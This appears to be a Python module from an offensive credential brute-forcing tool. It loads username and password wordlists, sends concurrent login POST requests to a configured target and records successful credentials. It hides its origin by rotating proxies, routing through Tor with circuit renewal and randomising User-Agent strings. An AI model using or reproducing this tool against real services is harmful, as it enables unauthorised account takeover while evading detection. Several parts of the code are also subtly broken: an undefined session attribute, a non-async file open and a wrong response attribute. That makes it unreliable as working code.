import asyncio
import aiohttp
import uvloop
import random
import ua_generator
import logging
import aiofiles as aiof
from stem.control import Controller
from typing import Any, List, Optional, Union
from . import ReadYAMLFile, verify_response
from .process import PreProcessing, Clusters

log = logging.getLogger(__name__)

# Set the event loop policy to uvloop for better performance.
uvloop.install()
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

class Proxy:
    """
    Class to manage the proxy.
    """
    def __init__(self, config: Any):
        self.proxy: Union[List[str], str, None] = config.connections.proxies or config.connections.proxy

    def get(self) -> Optional[str]:
        """
        Get a random proxy from the list.
        """
        if isinstance(self.proxy, list):
            return random.choice(self.proxy)
        return self.proxy

    def set(self, value: str) -> None:
        """
        Set a new proxy.
        """
        self.proxy = value

class Tor:
    """
    Class to manage Tor connections.
    """
    def __init__(self, config: Any):
        self.tor = config.connections.tor
        self.controller: Optional[Controller] = None

    def connect(self) -> None:
        """
        Connect to the Tor network.
        """
        try:
            self.controller = Controller.from_port(port=self.tor.port)
            self.controller.authenticate(password=self.tor.password)
            print("Connected to ControlPort")
        except (ConnectionRefusedError, ConnectionError) as err:
            print(f"Error trying to connect to Tor:\n{err}")

    def renew_circuit(self) -> None:
        """
        Renew the Tor circuit.
        """
        if self.controller and self.controller.is_authenticated():
            try:
                self.controller.signal("NEWNYM")
                print("The new circuit was created successfully")
            except Exception as e:
                print(f"Failed to create another circuit:\n{e}")

    def close(self) -> None:
        """
        Close the connection to the Tor network.
        """
        if self.controller:
            self.controller.close()
        
class Attack:
    """
    Class to manage the attack.
    """
    def __init__(
            self, 
            attack_file: str = "configs/attack.yaml", 
            proxy: Optional[str] = None, 
            tor: Optional[bool] = False, 
            proxies: Optional[bool] = False, 
            random_agent: Optional[bool] = False, 
            user_agent: Optional[str] = None,
            user_agent_list_file: Optional[str] = None,
            output: Optional[str] = None
            ) -> None:
        self.config = ReadYAMLFile(attack_file)
        self.output = output
        self.response = self.config.response.success or self.config.response.fail
        if user_agent:
            self.config.headers['User-Agent'] = user_agent
        elif random_agent:
            self.config.headers['User-Agent'] = ua_generator.generate().text
        if user_agent_list_file:
            with open(user_agent_list_file, "r") as file:
                user_agents = file.read().splitlines()
            self.config.headers['User-Agent'] = random.choice(user_agents)
        self.proxy: Optional[Union[str, Proxy]] = None
        p = Proxy(self.config)
        if proxies:
            self.proxy = p.get()
        if proxy:
            p.set(proxy)
        t = Tor(self.config)
        if tor:
            self.proxy = t.tor.address
            t.connect()
        if self.proxy:
            self.test_proxy_connection()

    def test_proxy_connection(self) -> None:
        """
        Test the connection with the proxy.
        """
        try:
            self.session.get("https://torproject.org", proxy=self.proxy)
            log.info("BOLDThe connection with the proxy was successful")
        except Exception as e:
            log.critical(f"The proxy server is refusing connections.\nCheck the proxy settings to make sure that they are correct.\nContact your network administrator to make sure the proxy server is working;\n\n{e}")

    async def load_wordlists(self) -> None:
        """
        Load wordlists from the file.
        """
        log.info("Loading and preparing payloads")
        self.payloads = await PreProcessing(self.config.credentials.passwords, self.config.credentials.usernames).make(self.config.body.data)
    
    async def attack(self):
        """
        Send the payload to the target.
        """
        await self.load_wordlists()
        self.total = len(self.payloads)
        log.info(f"BOLDPayloads were created with successful | __H{self.total}__h payloads")
        log.info("Starting the attack")
        self.sm = asyncio.Semaphore(int(self.config.connection.limit_connections))
        tasks = [
            asyncio.create_task(self.send(data=data, i=i))
            for i, data in enumerate(self.payloads)
        ]

        return await asyncio.gather(*tasks)

    async def send(self, data: str, i: int) -> tuple[str, any]:
        """
        Send a POST request with the given data.
        """
        async with aiohttp.request(
            url=self.config.body.url, 
            method=self.config.body.method, 
            data=data
        ) as response:
                
            had_success: bool = await verify_response(expected_response=self.response, response=response)

            if (self.config.response.success and had_success) or (self.config.response.fail and not had_success):
                    log.info(f"BOLD[ATTEMPT] ({i + 1}/{self.total}) - \033[38;2;255;0;111mMAIN\033[0m - \033[32;1m{data}\033[0m => \033[32;1mSUCCESS\033[0m : \033[38;5;214m{response.status}\033[0m")
                    if self.output:
                        async with aiof.open(self.output, "a") as file:
                            await file.write(f"[+] {data} - {response.status_code}\n")
                    return None
            log.debug(f"[ATTEMPT] ({i + 1}/{self.total}) - MAIN - {data} => \033[31;1mFAIL\033[0m : \033[38;5;214m{response.status}\033[0m")

class MultipleAttack(Attack):
    """
    Class to manage multiple attacks.
    """
    def __init__(
            self, 
            config: Any, 
            number_of_processes: Optional[int] = 0, 
            proxy: Optional[str] = None, 
            tor: Optional[bool] = False,
            proxies: Optional[bool] = False,
            random_agent: Optional[bool] = True,
            user_agent_list: Optional[str] = None
            ):
        super().__init__(
            config, 
            proxy=proxy, 
            proxies=proxies, 
            tor=tor, 
            random_agent=random_agent, 
            user_agent_list_file=user_agent_list
        )

        self.number_of_processes = number_of_processes

    def get_attack_configurations(self) -> List[Any]:
        """
        Get attack configurations from multiple files.
        """
        return [ReadYAMLFile(config) for config in self.config.configuration_files]

    async def __attack(self, config: Any) -> None:
        """
        Perform an attack with a given configuration.
        """
        super().__init__(config)
        await self.attack()

    async def run(self, id: int) -> None:
        """
        Run attacks for a specific configuration ID.
        """
        tasks = [
            self.__attack(config)
            for config in self.get_attack_configurations()[id]
        ]
        await asyncio.gather(*tasks)

    async def start(self) -> None:
        """
        Start the attack processes.
        """
        clusters = Clusters(self.number_of_processes)
        for id, cluster in enumerate(clusters.clusters):
            cluster.map(self.run, id)

class MultipleWordlists(Attack):
    """
    Class to manage attacks with multiple wordlists.
    """
    def __init__(
            self, 
            config: str, 
            number_of_threads: int = 0,
            proxy: Optional[str] = None, 
            tor: Optional[bool] = False,
            proxies: Optional[bool] = False,
            random_agent: Optional[bool] = True,
            user_agent_list: Optional[str] = None
            ):
        super().__init__(
            config, 
            proxy=proxy,
            tor=tor,
            proxies=proxies,
            random_agent=random_agent,
            user_agent_list_file=user_agent_list
            )
        self.number_of_threads = number_of_threads

    def get_wordlists(self) -> List[List[str]]:
        """
        Get wordlists for usernames and passwords.
        """
        wordlists = [[], []]
        if isinstance(self.config.credentials.passwords, list):
            wordlists[0] = self.config.credentials.passwords
        else:
            wordlists[0] = [self.config.credentials.passwords]
        if isinstance(self.config.credentials.usernames, list):
            wordlists[1] = self.config.credentials.usernames
        else:
            wordlists[1] = [self.config.credentials.usernames]

        for i, passwords in enumerate(wordlists[0]):
            with aiof.open(passwords, "r") as file:
                wordlists[0][i] = file.read().splitlines()

        for i, usernames in enumerate(wordlists[1]):
            with aiof.open(usernames, "r") as file:
                wordlists[1][i] = file.read().splitlines()

        self.wordlists = wordlists

    async def get_payloads(self, id: int) -> List[str]:
        """
        Get payloads for a specific wordlist ID.
        """
        return await PreProcessing(self.wordlists[0][id], self.wordlists[1][id]).make(self.config.data)

    async def attack(self, id: int) -> None:
        """
        Perform an attack with payloads from a specific wordlist ID.
        """
        tasks = [
        self.send(payload) 
        for payload in await self.get_payloads(id)
        ]
        await asyncio.gather(*tasks)

    async def start(self) -> None:
        """
        Start the attack threads.
        """
        clusters = Clusters(self.number_of_threads)
        for id, cluster in enumerate(clusters.clusters):
            cluster.map(self.attack, id)